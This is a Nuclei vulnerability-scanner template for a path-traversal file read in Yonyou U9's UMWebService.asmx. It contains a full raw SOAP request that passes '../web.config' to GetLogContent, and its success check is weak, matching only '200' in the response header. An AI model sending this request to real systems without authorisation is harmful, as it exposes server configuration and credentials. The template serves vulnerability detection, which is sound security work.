nuclei/http/yonyou/yongyouOA-UMWebService-asmx-file-read.yaml

id: yongyouOA-UMWebService-asmx-file-read

info:
  name: 用友U9-UMWebService.asmx存在文件读取漏洞
  author: cnaq  
  severity: medium
  description: 用友U9-UMWebService.asmx存在文件读取漏洞
  reference: 
    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BU9-UMWebService.asmx%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
  tags: yongyouOA,NC,file,read,lfi

requests:
  - raw:
      - |
        POST /u9/OnLine/UMWebService.asmx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Safari/537.36
        Connection: close
        Content-Length: 381
        Content-Type: text/xml; charset=utf-8
        SOAPAction: "http://tempuri.org/GetLogContent"
        Accept-Encoding: gzip

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetLogContent xmlns="http://tempuri.org/">
              <fileName>../web.config</fileName>
            </GetLogContent>
          </soap:Body>
        </soap:Envelope>

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - '200'